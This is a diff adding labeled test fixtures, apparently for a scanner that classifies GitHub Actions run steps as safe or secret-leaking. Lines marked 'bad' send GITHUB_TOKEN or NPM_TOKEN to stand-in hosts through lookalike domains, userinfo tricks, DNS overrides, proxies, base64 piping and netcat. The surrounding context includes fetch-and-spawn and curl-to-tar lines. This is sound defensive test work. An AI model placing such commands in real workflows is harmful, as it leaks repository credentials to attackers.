@@ -37,6 +37,22 @@ pm_fetch_py: html = requests.get(url).text
 pm_download_js: https.get('https://example.invalid/b', cb)
 pm_spawn_helper: spawn('/tmp/.helper')
 pm_spawn_next_dev: spawn('pnpm next dev')
+gt_ok_1: run: curl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN}}" https://api.github.com/repos/${{github.repository}}/issues/${{ github.event.issue.number}}/assignees -d '{"assignees":["x"]}'
+gt_ok_2: run: wget -q --header="Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://API.github.com/repos/o/r/pulls
+gt_ok_3: run: curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com:443/user
+gt_pagerduty: run: echo "C=$(curl --request GET 'https://api.pagerduty.com/oncalls' --header 'Authorization: Token token=${{ secrets.PAGERDUTY_TOKEN }}')" >> $GITHUB_OUTPUT
+gt_bad_1: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://example.invalid/collect
+gt_bad_2: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com.example.invalid/x
+gt_bad_3: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com@example.invalid/x
+gt_bad_4: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user https://example.invalid/x
+gt_bad_5: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" http://api.github.com/user
+gt_bad_6: run: curl -H "X-A: ${{ secrets.GITHUB_TOKEN }}" -H "X-B: ${{ secrets.NPM_TOKEN }}" https://api.github.com/user
+gt_bad_7: run: curl --resolve api.github.com:443:203.0.113.5 -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user
+gt_bad_8: run: curl -x $P -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user
+gt_bad_9: run: echo ${{ secrets.GITHUB_TOKEN }} | base64 | curl -d @- https://api.github.com/user
+gt_bad_10: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://${{ env.HOST }}/user
+gt_bad_11: run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user; curl -d x https://example.invalid/x
+gt_bad_12: run: nc 203.0.113.5 9 <<< ${{ secrets.GITHUB_TOKEN }} # https://api.github.com/user
 sh_curl_tar: curl -sL "https://example.invalid/dist/src.tar.gz" | tar xzf -
 sh_curl_tar_ip: curl -sL http://203.0.113.9/src.tar.gz | tar xzf -
 sh_configure: ./configure --prefix="$PREFIX" && make install
